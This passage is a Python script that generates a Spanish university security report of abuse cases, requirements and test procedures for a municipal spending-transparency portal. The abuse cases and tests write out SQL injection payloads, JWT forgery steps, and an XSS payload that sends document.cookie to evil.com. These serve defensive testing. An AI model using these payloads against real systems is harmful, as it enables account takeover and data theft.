# -*- coding: utf-8 -*-
"""
Generador de documento Word: Casos de Abuso y Gestión de Riesgos
Proyecto: GastoTransparente Municipal — ODS 16
"""

from docx import Document
from docx.shared import Pt, RGBColor, Cm, Inches
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT, WD_ALIGN_VERTICAL
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import copy

# ── Colores ───────────────────────────────────────────────────────────────────
AZUL_ODS    = "00588B"
AZUL_CLARO  = "1A73B8"
ROJO        = "C0392B"
NARANJA     = "E67E22"
AMARILLO    = "F39C12"
VERDE       = "27AE60"
GRIS_OSCURO = "2C3E50"
GRIS_CLARO  = "ECF0F1"
BLANCO      = "FFFFFF"

COLORES_RIESGO = {
    "CRÍTICO": ROJO,
    "ALTO":    NARANJA,
    "MEDIO":   AMARILLO,
    "BAJO":    VERDE,
}

# ── Datos ─────────────────────────────────────────────────────────────────────
REQUISITOS = [
    ("RS-01", "Funcional",     "Autenticación Multifactor (MFA)",
     "El sistema debe requerir MFA (TOTP/FIDO2) para todos los usuarios con roles de editor, auditor y administrador.",
     "Previene accesos no autorizados incluso si las credenciales son comprometidas por phishing o fuerza bruta."),
    ("RS-02", "No Funcional",  "Cifrado de Datos en Reposo y Tránsito",
     "Todos los datos sensibles se cifran con AES-256 en reposo y TLS 1.3 en tránsito.",
     "Garantiza confidencialidad e integridad ante accesos no autorizados a la infraestructura."),
    ("RS-03", "Funcional",     "Registro de Auditoría Inmutable (Append-Only Log)",
     "Cada inserción, modificación o eliminación de registros presupuestales genera una entrada en un log append-only firmado digitalmente.",
     "Permite trazabilidad completa de cambios y detecta manipulaciones de datos públicos."),
    ("RS-04", "No Funcional",  "Protección Anti-DDoS y Rate Limiting",
     "La plataforma debe soportar picos de 50 000 req/min con rate limiting por IP/token y CDN con scrubbing DDoS.",
     "El proyecto es políticamente sensible; un DDoS en período electoral puede silenciar la rendición de cuentas."),
    ("RS-05", "Funcional",     "Control de Acceso Basado en Roles (RBAC)",
     "Roles definidos: Ciudadano (solo lectura), Editor (escritura limitada), Auditor (revisión), Administrador (gestión total).",
     "Limita el radio de acción de credenciales comprometidas y reduce el riesgo de modificaciones no autorizadas."),
    ("RS-06", "Funcional",     "Firma Digital de Registros Presupuestales",
     "Cada registro público publicado debe incluir firma digital del funcionario responsable, verificable por cualquier ciudadano.",
     "Garantiza autenticidad e impide la repudiación; cualquier alteración invalida la firma."),
    ("RS-07", "No Funcional",  "Expiración de Sesión por Inactividad",
     "Sesiones de usuarios privilegiados expiran tras 10 min de inactividad; ciudadanos a los 30 min.",
     "Reduce la ventana de explotación de sesiones abiertas en equipos compartidos o robados."),
    ("RS-08", "Funcional",     "Validación y Sanitización de Entradas",
     "Todos los campos de formulario y parámetros de API deben validarse con whitelist y sanitizarse contra SQLi, XSS y Path Traversal.",
     "Bloquea las técnicas de inyección más comunes definidas en OWASP Top 10."),
    ("RS-09", "No Funcional",  "Política de Contraseñas y Bloqueo de Cuenta",
     "Contraseñas mínimo 12 caracteres con complejidad; bloqueo temporal tras 5 intentos fallidos; notificación por e-mail.",
     "Mitiga ataques de fuerza bruta y credential stuffing contra cuentas de funcionarios."),
    ("RS-10", "Funcional",     "Alertas SIEM en Tiempo Real",
     "El SIEM debe alertar en menos de 60 s ante anomalías: accesos fuera de horario, volumen inusual de descargas, cambios masivos.",
     "Permite respuesta temprana ante incidentes y reduce el MTTD (tiempo medio de detección)."),
    ("RS-11", "Funcional",     "Validación Estricta de JWT con Algoritmo Fijo",
     "Todos los endpoints deben usar jwt.verify() con { algorithms: ['HS256'] } explícito. Se prohíbe jwt.decode() en producción. El servidor rechaza tokens con alg:'none' o algoritmos no esperados con HTTP 401.",
     "Cierra el vector de escalada de privilegios por algorithm confusion attack y alg:none; RS-05 (RBAC) solo es efectivo si la validación del token es correcta en servidor."),
    ("RS-12", "Funcional",     "Atomicidad y Locks Pesimistas en Aprobación Multi-firma",
     "El flujo de aprobación dual se ejecuta en transacción atómica con SELECT FOR UPDATE. Cada aprobación requiere idempotency key de un solo uso. La BD verifica que los dos firmantes tengan IDs distintos antes del commit.",
     "Previene race conditions en el workflow de doble firma; sin este control RS-03 y RS-06 registran el fraude pero no lo impiden."),
    ("RS-13", "No Funcional",  "Correlación Multi-Vector en SIEM con Baseline por Token",
     "El SIEM correlaciona eventos de múltiples endpoints en ventanas de 30 min por token. Baseline ciudadano: alerta si >10 documentos únicos/hora. Control de acceso por estado: borradores solo accesibles para roles Auditor/Admin.",
     "Detecta ataques que operan por debajo del umbral individual de cada alerta; sin correlación CA-06 + CA-09 combinados son invisibles al SIEM estándar."),
]

CASOS_ABUSO = [
    {
        "id": "CA-01", "riesgo": "CRÍTICO", "probabilidad": "Alta", "impacto_nivel": "Alto",
        "nombre": "Manipulación de Registros Presupuestales por Funcionario Interno",
        "atacante": "Funcionario municipal con rol de Editor.",
        "objetivo": "Alterar montos de contratos públicos para ocultar una desviación de fondos.",
        "acciones": [
            "Inicia sesión con credenciales legítimas.",
            "Edita registros de contratos adjudicados cambiando montos y beneficiarios.",
            "Intenta borrar el historial de cambios si el sistema lo permite.",
        ],
        "impacto": "Pérdida de integridad de datos públicos; desinformación ciudadana; encubrimiento de corrupción y posibles sanciones legales para el municipio.",
        "mitigaciones": [
            "Log de auditoría append-only con firma digital; ningún usuario puede borrar entradas.",
            "Workflow de aprobación dual para cambios en contratos superiores a un umbral definido.",
            "Alertas automáticas al supervisor cuando se detecta modificación fuera de rango estadístico.",
        ],
    },
    {
        "id": "CA-02", "riesgo": "CRÍTICO", "probabilidad": "Alta", "impacto_nivel": "Alto",
        "nombre": "Ataque DDoS durante Rendición de Cuentas Electoral",
        "atacante": "Grupo político adversario o actor externo con acceso a botnet.",
        "objetivo": "Silenciar la plataforma en momentos de alta visibilidad pública (período electoral).",
        "acciones": [
            "Coordina botnet para enviar millones de solicitudes HTTP al portal.",
            "Satura los endpoints de búsqueda y descarga de informes con mayor tráfico.",
            "Usa IPs rotativas y proxies para evadir bloqueos simples por IP.",
        ],
        "impacto": "Indisponibilidad del servicio en período crítico; daño a la confianza pública; silencio informativo que beneficia a actores corruptos.",
        "mitigaciones": [
            "CDN con protección DDoS integrada (Cloudflare / AWS Shield Advanced).",
            "Rate limiting por IP, token y geolocalización con respuesta automática.",
            "Auto-scaling y arquitectura serverless para absorber picos legítimos de tráfico.",
        ],
    },
    {
        "id": "CA-03", "riesgo": "ALTO", "probabilidad": "Media", "impacto_nivel": "Alto",
        "nombre": "Inyección SQL en Buscador de Contratos",
        "atacante": "Atacante externo con conocimiento técnico (pentester malicioso, competidor).",
        "objetivo": "Extraer datos confidenciales de la base de datos o eliminar registros históricos.",
        "acciones": [
            "Ingresa payloads SQL en el campo de búsqueda: ' OR '1'='1'--",
            "Usa UNION SELECT para extraer tablas internas (usuarios, credenciales).",
            "Intenta DROP TABLE para destruir el historial de contratos.",
        ],
        "impacto": "Exposición de datos internos y credenciales; destrucción de registros históricos; pérdida irreversible de información pública.",
        "mitigaciones": [
            "Usar ORM con consultas parametrizadas; prohibir SQL dinámico.",
            "WAF (Web Application Firewall) con reglas OWASP Core Rule Set.",
            "Principio de mínimo privilegio: el usuario de BD solo tiene SELECT/INSERT en tablas necesarias.",
        ],
    },
    {
        "id": "CA-04", "riesgo": "ALTO", "probabilidad": "Media", "impacto_nivel": "Alto",
        "nombre": "XSS Persistente en Panel de Comentarios Ciudadanos",
        "atacante": "Ciudadano malintencionado o actor político con cuenta básica.",
        "objetivo": "Robar sesiones de administradores o inyectar desinformación visual en la plataforma.",
        "acciones": [
            "Publica un comentario con script malicioso embebido en el campo de texto.",
            "El script se ejecuta cuando un administrador visualiza el comentario desde el panel.",
            "Exfiltra el token de sesión del administrador a un servidor controlado por el atacante.",
        ],
        "impacto": "Toma de control de cuenta de administrador; desinformación masiva visible a ciudadanos; posible defacement del portal.",
        "mitigaciones": [
            "Sanitización de salida HTML con biblioteca DOMPurify y política Content-Security-Policy estricta.",
            "Tokens de sesión con flags HttpOnly y Secure; inaccesibles desde JavaScript.",
            "Moderación de comentarios antes de su publicación pública.",
        ],
    },
    {
        "id": "CA-05", "riesgo": "CRÍTICO", "probabilidad": "Alta", "impacto_nivel": "Alto",
        "nombre": "Suplantación de Identidad de Funcionario (Phishing)",
        "atacante": "Atacante externo que compromete el correo corporativo de un funcionario.",
        "objetivo": "Publicar datos falsos haciéndose pasar por un funcionario autorizado.",
        "acciones": [
            "Envía e-mail de spear-phishing al funcionario para robar sus credenciales.",
            "Accede al panel con las credenciales robadas desde una IP diferente.",
            "Publica contratos falsos o altera montos del presupuesto antes de ser detectado.",
        ],
        "impacto": "Datos falsos publicados como oficiales; pérdida de credibilidad institucional; crisis de confianza ciudadana y posible manipulación de mercados.",
        "mitigaciones": [
            "MFA obligatorio (TOTP o FIDO2): credenciales robadas no bastan para acceder.",
            "Análisis de comportamiento: login desde IP/país inusual activa bloqueo y notificación.",
            "Capacitación anti-phishing obligatoria y simulacros periódicos para funcionarios.",
        ],
    },
    {
        "id": "CA-06", "riesgo": "ALTO", "probabilidad": "Media", "impacto_nivel": "Medio",
        "nombre": "Acceso No Autorizado a Reportes Confidenciales (IDOR)",
        "atacante": "Ciudadano, periodista o actor con acceso básico a la plataforma.",
        "objetivo": "Acceder a informes de auditoría internos antes de su publicación oficial.",
        "acciones": [
            "Observa la URL de un documento: /reportes/2026/informe_123.pdf",
            "Modifica el ID secuencial: /reportes/2026/informe_001.pdf (aún no publicado).",
            "Descarga documentos confidenciales iterando IDs con un script automatizado.",
        ],
        "impacto": "Filtración de datos de auditoría preliminares; uso político de información sin contexto; violación del proceso institucional de revisión.",
        "mitigaciones": [
            "UUIDs no predecibles en lugar de IDs secuenciales para todos los recursos.",
            "Verificación explícita de permisos en cada solicitud de recurso (no confiar en oscuridad).",
            "Logs de acceso a documentos sensibles con alertas ante patrones de iteración.",
        ],
    },
    {
        "id": "CA-07", "riesgo": "ALTO", "probabilidad": "Alta", "impacto_nivel": "Alto",
        "nombre": "Fuerza Bruta sobre Cuentas de Auditores",
        "atacante": "Atacante automatizado (script/bot) o actor con lista de credenciales filtradas.",
        "objetivo": "Obtener acceso privilegiado mediante ataque de diccionario o credential stuffing.",
        "acciones": [
            "Descarga listas de contraseñas comunes (rockyou.txt, breach databases).",
            "Ataca el endpoint de login con miles de combinaciones por minuto.",
            "Prueba credential stuffing usando brechas de datos de otras plataformas.",
        ],
        "impacto": "Compromiso de cuenta de auditor; acceso a datos internos no publicados; posibilidad de manipular o eliminar registros.",
        "mitigaciones": [
            "Bloqueo temporal de IP y de cuenta tras 5 intentos fallidos; desbloqueo con CAPTCHA.",
            "Notificación inmediata al usuario por e-mail ante intentos fallidos repetidos.",
            "MFA como segunda barrera aunque la contraseña haya sido comprometida.",
        ],
    },
    {
        "id": "CA-08", "riesgo": "ALTO", "probabilidad": "Media", "impacto_nivel": "Alto",
        "nombre": "Defacement del Portal Público",
        "atacante": "Hacktivista o grupo de presión política con capacidades técnicas.",
        "objetivo": "Alterar la apariencia del portal para difundir mensajes de desinformación.",
        "acciones": [
            "Explota una vulnerabilidad en el CMS o en una dependencia desactualizada.",
            "Reemplaza la página principal con contenido político falso o difamatorio.",
            "Deja mensaje o malware para afectar a los visitantes del portal.",
        ],
        "impacto": "Daño reputacional severo al municipio; pérdida de confianza institucional; posible infección de equipos de ciudadanos visitantes.",
        "mitigaciones": [
            "WAF + IDS/IPS con reglas de detección de modificación de archivos en tiempo real.",
            "Monitoreo de integridad de archivos (AIDE/Tripwire) con alerta inmediata.",
            "Pipeline CI/CD con despliegues inmutables: ningún archivo es modificable en producción directamente.",
        ],
    },
    {
        "id": "CA-09", "riesgo": "MEDIO", "probabilidad": "Alta", "impacto_nivel": "Medio",
        "nombre": "Exfiltración Masiva de Datos vía API sin Restricción",
        "atacante": "Competidor, lobbyist o actor con interés económico y token de API legítimo.",
        "objetivo": "Descargar toda la base de datos de contratos públicos para análisis privado no autorizado.",
        "acciones": [
            "Obtiene un token de API público o legítimo de un ciudadano registrado.",
            "Itera llamadas a /api/contratos?page=1..N sin que haya restricción de volumen.",
            "Exporta la base de datos completa en pocas horas para uso comercial privado.",
        ],
        "impacto": "Uso comercial no autorizado de datos públicos; posible identificación de patrones para corrupción; carga excesiva en el servidor que degrada el servicio.",
        "mitigaciones": [
            "Rate limiting por token: máximo 100 req/min con respuesta HTTP 429 al excederlo.",
            "Paginación obligatoria con límite de resultados por página (máx. 100 registros).",
            "Términos de uso claros con registro de API keys; suspensión automática ante abuso.",
        ],
    },
    {
        "id": "CA-10", "riesgo": "ALTO", "probabilidad": "Baja", "impacto_nivel": "Alto",
        "nombre": "Carga de Documentos Maliciosos (Malware Upload)",
        "atacante": "Funcionario comprometido o atacante con acceso de editor.",
        "objetivo": "Alojar malware en el servidor bajo apariencia de documentos oficiales.",
        "acciones": [
            "Sube un archivo PDF con JavaScript embebido o un DOCX con macro maliciosa.",
            "El archivo queda publicado como 'Informe Oficial' disponible para descarga.",
            "Ciudadanos, periodistas o funcionarios descargan el archivo e infectan sus equipos.",
        ],
        "impacto": "Infección masiva de dispositivos de ciudadanos; daño reputacional crítico al municipio; posible responsabilidad legal por distribución de malware.",
        "mitigaciones": [
            "Análisis antivirus en tiempo real en el servidor de carga (ClamAV / VirusTotal API).",
            "Lista blanca de extensiones permitidas con validación MIME real (no solo extensión).",
            "Sandbox de documentos antes de publicación definitiva; conversión a PDF limpio.",
        ],
    },
    {
        "id": "CA-11", "riesgo": "CRÍTICO", "probabilidad": "Alta", "impacto_nivel": "Alto",
        "nombre": "Escalada de Privilegios por Manipulación de JWT (Algorithm Confusion)",
        "atacante": "Ciudadano técnico con cuenta registrada y conocimiento de criptografía básica.",
        "objetivo": "Elevar privilegios de rol Ciudadano a Administrador sin credenciales válidas de alto nivel.",
        "acciones": [
            "Se autentica como ciudadano y captura el JWT con Burp Suite Proxy.",
            "Decodifica el payload en base64: {\"sub\":\"123\", \"role\":\"citizen\", \"exp\":1234567890}.",
            "Intenta 'algorithm confusion attack': cambia alg de RS256 a HS256 usando la clave pública como secreto HMAC.",
            "Si el servidor usa jwt.decode() en lugar de jwt.verify(), acepta el token manipulado sin validar firma.",
            "Envía token con role:'admin' a /api/admin/contratos; obtiene acceso completo.",
            "Extrae lista de auditores reales → base para phishing dirigido (CA-05).",
        ],
        "impacto": "Compromiso total del RBAC. Un ciudadano opera como Administrador: modifica contratos públicos, crea cuentas con privilegios y prepara ataques de phishing sobre auditores reales.",
        "mitigaciones": [
            "Usar SIEMPRE jwt.verify() con algoritmo fijo { algorithms: ['HS256'] } — rechaza 'none' y confusion attacks.",
            "Verificar rol en BD en cada endpoint (no confiar solo en el contenido del token).",
            "JWT secrets mínimo 256 bits, rotación 90 días, expiración máx. 30 min.",
            "Auditoría inmediata ante intentos de acceso Admin con token de rol inferior.",
        ],
    },
    {
        "id": "CA-12", "riesgo": "ALTO", "probabilidad": "Media", "impacto_nivel": "Alto",
        "nombre": "Race Condition en Flujo de Aprobación Dual de Contratos",
        "atacante": "Funcionario Editor interno con herramientas de automatización básica (curl/script).",
        "objetivo": "Aprobar un contrato fraudulento con una sola firma, burlando el workflow de doble aprobación.",
        "acciones": [
            "Edita contrato cambiando monto de $100M a $175M.",
            "Envía solicitud de aprobación al workflow dual (requiere Auditor A y Auditor B).",
            "Lanza 50 requests concurrentes al endpoint POST /api/contratos/{id}/aprobar con su propio token.",
            "La race condition permite que el servidor procese dos 'aprobaciones' antes de verificar unicidad de firmantes.",
            "El contrato queda APROBADO; el log registra dos timestamps casi idénticos del mismo usuario.",
        ],
        "impacto": "Contrato de $175M aprobado con proceso aparentemente válido. RS-03 (log) registra el fraude pero no lo previene; RS-06 (firma) existe pero es del mismo actor duplicado por race condition.",
        "mitigaciones": [
            "Locks pesimistas en BD: SELECT FOR UPDATE en la fila del contrato durante aprobación.",
            "Idempotency key por aprobación: cada firma requiere token único de un solo uso.",
            "Verificación a nivel BD que los dos firmantes tienen IDs diferentes antes del commit.",
            "Alerta SIEM ante dos aprobaciones del mismo contrato con timestamps < 5 segundos.",
        ],
    },
    {
        "id": "CA-13", "riesgo": "ALTO", "probabilidad": "Alta", "impacto_nivel": "Alto",
        "nombre": "Exfiltración Encubierta Multi-Vector (IDOR + API Scraping correlacionado)",
        "atacante": "Periodista técnico con token de ciudadano y scripts de automatización.",
        "objetivo": "Descargar informes internos no publicados y correlacionarlos con datos públicos para obtener inteligencia política privilegiada.",
        "acciones": [
            "Obtiene token ciudadano legítimo; comienza enumeración de IDs en /reportes.",
            "Descubre que /api/reportes?estado=borrador filtra por estado sin verificar permisos del solicitante.",
            "Descarga 1–3 reportes por minuto (bajo el umbral de 100 req/min de RS-04) alternando endpoints.",
            "Combina datos internos con datos públicos para identificar contratos bajo revisión.",
            "Toda la actividad aparece legítima en el SIEM: un ciudadano accediendo a documentos.",
        ],
        "impacto": "Filtración de auditorías pre-publicación sin disparar ninguna alerta. El atacante obtiene ventaja política antes que el público; cada vector individual parece inocuo al SIEM.",
        "mitigaciones": [
            "Control de acceso explícito por estado: borradores solo accesibles para Auditor/Admin.",
            "Correlación multi-vector en SIEM: mismo token accediendo a múltiples endpoints sensibles en 30 min.",
            "Baseline de comportamiento: alerta si token ciudadano accede a >10 documentos únicos/hora.",
            "Auditoría diferenciada por categoría de documento (público vs. en revisión interna).",
        ],
    },
]

PRUEBAS = [
    {
        "ca": "CA-01",
        "objetivo": "Verificar que el log de auditoría registra e impide la eliminación de modificaciones en registros presupuestales.",
        "procedimiento": "Editar un contrato existente y verificar que el cambio queda registrado con usuario, timestamp y hash del valor anterior. Intentar borrar la entrada del log con el mismo usuario.",
        "resultado_esperado": "Entrada inmutable en el log con firma digital. Alerta enviada al supervisor dentro de los 60 segundos.",
        "criterio": "El log no puede ser borrado ni editado por ningún usuario, incluyendo el administrador.",
    },
    {
        "ca": "CA-02",
        "objetivo": "Evaluar la resistencia del sistema a un ataque DDoS simulado.",
        "procedimiento": "Enviar 10 000 req/min durante 5 minutos con Apache JMeter contra el endpoint de búsqueda de contratos.",
        "resultado_esperado": "El sistema mantiene tiempo de respuesta <3 s para el 95 % de usuarios legítimos. Las IPs atacantes son bloqueadas automáticamente.",
        "criterio": "No se produce caída total del servicio; el rate limiter actúa en menos de 10 segundos.",
    },
    {
        "ca": "CA-03",
        "objetivo": "Detectar vulnerabilidades de inyección SQL en el buscador de contratos.",
        "procedimiento": "Usar SQLMap y payloads manuales (' OR '1'='1'--, UNION SELECT NULL--) en todos los campos de entrada del buscador.",
        "resultado_esperado": "El sistema rechaza las entradas maliciosas con HTTP 400. No se retorna ninguna información de la base de datos.",
        "criterio": "Cero consultas SQL no parametrizadas ejecutadas; el WAF registra y bloquea el intento.",
    },
    {
        "ca": "CA-04",
        "objetivo": "Verificar que el sistema neutraliza scripts maliciosos en comentarios ciudadanos.",
        "procedimiento": "Insertar <script>alert(1)</script> y <img onerror=\"fetch('evil.com?c='+document.cookie)\"> en campos de comentario como usuario ciudadano.",
        "resultado_esperado": "El script no se ejecuta; la salida aparece como texto plano o es completamente eliminada.",
        "criterio": "La política Content-Security-Policy bloquea la ejecución; los tokens de sesión no son accesibles vía JavaScript.",
    },
    {
        "ca": "CA-05",
        "objetivo": "Verificar que el MFA bloquea el acceso incluso con credenciales robadas.",
        "procedimiento": "Con usuario y contraseña válidos (simulando phishing exitoso), intentar completar el login sin el segundo factor (TOTP) desde una IP no registrada.",
        "resultado_esperado": "El sistema deniega el acceso y solicita el segundo factor. El usuario legítimo recibe notificación del intento.",
        "criterio": "Es imposible autenticarse con solo usuario+contraseña desde una IP o dispositivo no reconocido.",
    },
    {
        "ca": "CA-06",
        "objetivo": "Detectar vulnerabilidades IDOR en endpoints de documentos.",
        "procedimiento": "Con un usuario ciudadano, modificar manualmente el UUID en URLs de reportes internos. Usar Burp Suite para iterar sistemáticamente valores de IDs.",
        "resultado_esperado": "HTTP 403 Forbidden para cualquier documento al que el usuario no tenga permiso explícito.",
        "criterio": "Cero accesos exitosos a recursos no autorizados; todos los intentos quedan registrados en el log de auditoría.",
    },
    {
        "ca": "CA-07",
        "objetivo": "Verificar que el sistema bloquea ataques de fuerza bruta y credential stuffing.",
        "procedimiento": "Ejecutar Hydra con lista de 1 000 contraseñas comunes contra el endpoint de login de un auditor durante 3 minutos.",
        "resultado_esperado": "La cuenta se bloquea temporalmente tras 5 intentos fallidos; se activa CAPTCHA para continuar.",
        "criterio": "Menos del 0.1 % de intentos de fuerza bruta resultan en login exitoso.",
    },
    {
        "ca": "CA-08",
        "objetivo": "Detectar modificaciones no autorizadas en archivos del portal en tiempo real.",
        "procedimiento": "Modificar directamente un archivo JS de la página principal en el servidor de producción; verificar que el sistema de monitoreo de integridad lo detecta.",
        "resultado_esperado": "Alerta generada en menos de 60 segundos; el archivo es restaurado automáticamente desde el último despliegue limpio.",
        "criterio": "El sistema de integridad de archivos detecta el cambio y notifica al equipo de seguridad sin intervención manual.",
    },
    {
        "ca": "CA-09",
        "objetivo": "Verificar que el rate limiting protege contra exfiltración masiva vía API.",
        "procedimiento": "Con un token legítimo de ciudadano, ejecutar un script Python que realice 500 llamadas a /api/contratos en 1 minuto.",
        "resultado_esperado": "El sistema devuelve HTTP 429 (Too Many Requests) a partir de la solicitud número 101.",
        "criterio": "El rate limit se aplica correctamente; las solicitudes excedentes no retornan datos y generan un registro de alerta.",
    },
    {
        "ca": "CA-10",
        "objetivo": "Verificar que el sistema rechaza archivos maliciosos en la carga de documentos.",
        "procedimiento": "Intentar subir archivos .exe, .php, DOCX con macro VBA y PDF con JavaScript embebido usando una cuenta de editor.",
        "resultado_esperado": "El sistema rechaza todos los archivos no permitidos con mensaje de error claro. Ningún archivo malicioso queda almacenado en el servidor.",
        "criterio": "Solo se aceptan extensiones de la lista blanca; el análisis antivirus detecta los archivos de prueba EICAR estándar.",
    },
    {
        "ca": "CA-11",
        "objetivo": "Verificar que el servidor rechaza tokens JWT con algoritmo manipulado o sin firma.",
        "procedimiento": "Con un token ciudadano válido: (1) modificar el header a alg:'none' y eliminar la firma; (2) intentar algorithm confusion cambiando RS256 a HS256 con clave pública; (3) modificar el payload role:'citizen' → role:'admin'. Enviar cada variante a GET /api/admin/contratos.",
        "resultado_esperado": "HTTP 401 Unauthorized para todos los tokens manipulados. Ningún endpoint retorna datos de Admin con token de ciudadano modificado. Alerta generada en el SIEM.",
        "criterio": "El servidor usa jwt.verify() con algoritmos fijos; jwt.decode() no existe en ningún endpoint de producción. Cero accesos exitosos con tokens forjados.",
    },
    {
        "ca": "CA-12",
        "objetivo": "Verificar que el flujo de aprobación dual no es vulnerable a race conditions.",
        "procedimiento": "Con una cuenta Editor: enviar 50 requests concurrentes (usando Apache Benchmark: ab -n 50 -c 50) al endpoint POST /api/contratos/{id}/aprobar con el mismo token. Verificar el estado final del contrato y el log de auditoría.",
        "resultado_esperado": "Solo una aprobación queda registrada por el token Editor. El contrato permanece en estado PENDIENTE (requiere un segundo firmante distinto). La BD no entra en estado inconsistente.",
        "criterio": "Los locks pesimistas previenen que el mismo token apruebe más de una vez. La idempotency key rechaza requests duplicados con HTTP 409 Conflict.",
    },
    {
        "ca": "CA-13",
        "objetivo": "Verificar que el SIEM detecta exfiltración encubierta multi-vector y que los borradores no son accesibles a ciudadanos.",
        "procedimiento": "(1) Con token ciudadano, acceder a /api/reportes?estado=borrador — verificar respuesta HTTP 403. (2) Simular acceso a 15 documentos distintos en 60 minutos con el mismo token ciudadano y verificar que el SIEM genera alerta.",
        "resultado_esperado": "HTTP 403 para cualquier consulta de documentos en estado borrador con rol ciudadano. Alerta generada en el SIEM tras el décimo documento único accedido en la ventana de 1 hora.",
        "criterio": "El control de acceso por estado de documento funciona independientemente del rate-limit. La correlación multi-vector del SIEM detecta el patrón en menos de 60 segundos tras superar el umbral.",
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# Helpers de formato
# ─────────────────────────────────────────────────────────────────────────────

def set_cell_bg(cell, hex_color):
    tc = cell._tc
    tcPr = tc.get_or_add_tcPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:color"), "auto")
    shd.set(qn("w:fill"), hex_color)
    tcPr.append(shd)

def set_cell_border(cell, border_color="CCCCCC", size="4"):
    tc = cell._tc
    tcPr = tc.get_or_add_tcPr()
    tcBorders = OxmlElement("w:tcBorders")
    for side in ("top", "left", "bottom", "right"):
        border = OxmlElement(f"w:{side}")
        border.set(qn("w:val"), "single")
        border.set(qn("w:sz"), size)
        border.set(qn("w:space"), "0")
        border.set(qn("w:color"), border_color)
        tcBorders.append(border)
    tcPr.append(tcBorders)

def para_fmt(para, align=WD_ALIGN_PARAGRAPH.LEFT, space_before=0, space_after=0):
    para.alignment = align
    para.paragraph_format.space_before = Pt(space_before)
    para.paragraph_format.space_after = Pt(space_after)

def run_fmt(run, size=11, bold=False, italic=False, color=None):
    run.font.size = Pt(size)
    run.font.bold = bold
    run.font.italic = italic
    if color:
        run.font.color.rgb = RGBColor.from_string(color)

def add_heading(doc, text, level=1, color=AZUL_ODS):
    h = doc.add_heading(text, level=level)
    h.alignment = WD_ALIGN_PARAGRAPH.LEFT
    for run in h.runs:
        run.font.color.rgb = RGBColor.from_string(color)
    return h

def add_colored_para(doc, label, value, label_color=AZUL_ODS, value_color=GRIS_OSCURO, size=11):
    p = doc.add_paragraph()
    para_fmt(p, space_after=2)
    r1 = p.add_run(label)
    run_fmt(r1, size=size, bold=True, color=label_color)
    r2 = p.add_run(value)
    run_fmt(r2, size=size, color=value_color)
    return p

def add_badge_para(doc, text, bg_color_hex, text_color=BLANCO, size=12):
    """Simula un badge de riesgo como párrafo sombreado."""
    p = doc.add_paragraph()
    para_fmt(p, space_before=2, space_after=4)
    r = p.add_run(f"  {text}  ")
    run_fmt(r, size=size, bold=True, color=text_color)
    # Sombreado del run (highlight no soporta colores personalizados, usamos shd en XML)
    rPr = r._r.get_or_add_rPr()
    shd = OxmlElement("w:highlight")
    shd.set(qn("w:val"), "none")
    rPr.append(shd)
    return p

def add_separator(doc, color=AZUL_ODS):
    p = doc.add_paragraph()
    para_fmt(p, space_before=4, space_after=4)
    pPr = p._p.get_or_add_pPr()
    pBdr = OxmlElement("w:pBdr")
    bottom = OxmlElement("w:bottom")
    bottom.set(qn("w:val"), "single")
    bottom.set(qn("w:sz"), "6")
    bottom.set(qn("w:space"), "1")
    bottom.set(qn("w:color"), color)
    pBdr.append(bottom)
    pPr.append(pBdr)


# ─────────────────────────────────────────────────────────────────────────────
# Secciones del documento
# ─────────────────────────────────────────────────────────────────────────────

def portada(doc):
    p = doc.add_paragraph()
    para_fmt(p, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=48, space_after=6)
    r = p.add_run("Universidad\nFacultad de Ingeniería\nSoftware Seguro — 2026")
    run_fmt(r, size=12, color=GRIS_OSCURO)

    p2 = doc.add_paragraph()
    para_fmt(p2, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=24, space_after=6)
    r2 = p2.add_run("Casos de Abuso y Gestión de Riesgos")
    run_fmt(r2, size=22, bold=True, color=AZUL_ODS)

    p3 = doc.add_paragraph()
    para_fmt(p3, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=6, space_after=6)
    r3 = p3.add_run("GastoTransparente Municipal")
    run_fmt(r3, size=16, bold=True, color=AZUL_CLARO)

    p4 = doc.add_paragraph()
    para_fmt(p4, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=4, space_after=4)
    r4 = p4.add_run("Plataforma de Transparencia y Seguimiento de Gasto Público Municipal")
    run_fmt(r4, size=12, italic=True, color=GRIS_OSCURO)

    p5 = doc.add_paragraph()
    para_fmt(p5, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=4, space_after=4)
    r5 = p5.add_run("ODS 16 — Paz, Justicia e Instituciones Sólidas")
    run_fmt(r5, size=12, bold=True, color=VERDE)

    add_separator(doc, AZUL_ODS)

    p6 = doc.add_paragraph()
    para_fmt(p6, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=8, space_after=2)
    r6 = p6.add_run("Integrantes:")
    run_fmt(r6, size=11, bold=True, color=GRIS_OSCURO)

    p7 = doc.add_paragraph()
    para_fmt(p7, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=2, space_after=2)
    r7 = p7.add_run("Rodrigo Vallejo")
    run_fmt(r7, size=11, color=GRIS_OSCURO)

    p8 = doc.add_paragraph()
    para_fmt(p8, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=6, space_after=2)
    r8 = p8.add_run("Septiembre 2026")
    run_fmt(r8, size=11, italic=True, color=GRIS_OSCURO)

    doc.add_page_break()


def seccion_contexto(doc):
    add_heading(doc, "1. Contexto del Proyecto", level=1)

    p = doc.add_paragraph()
    r = p.add_run(
        "GastoTransparente Municipal es una plataforma web pública que permite a ciudadanos, periodistas "
        "y organizaciones civiles fiscalizar el uso de fondos públicos municipales en tiempo real. "
        "Los datos son de carácter público, pero presentan un alto riesgo de manipulación por actores "
        "políticos o económicos, lo que convierte la seguridad en un requisito crítico y no opcional."
    )
    run_fmt(r, size=11, color=GRIS_OSCURO)

    add_heading(doc, "Atributos de Seguridad Clave", level=2, color=AZUL_CLARO)
    attrs = [
        ("Integridad: ", "Control de versiones auditable de cada registro presupuestal publicado."),
        ("Disponibilidad: ", "Alta disponibilidad ante ataques DDoS, especialmente en períodos electorales."),
        ("Confidencialidad: ", "Protección de documentos internos antes de su publicación oficial."),
        ("Trazabilidad: ", "Log inmutable de todas las modificaciones con firma digital del funcionario."),
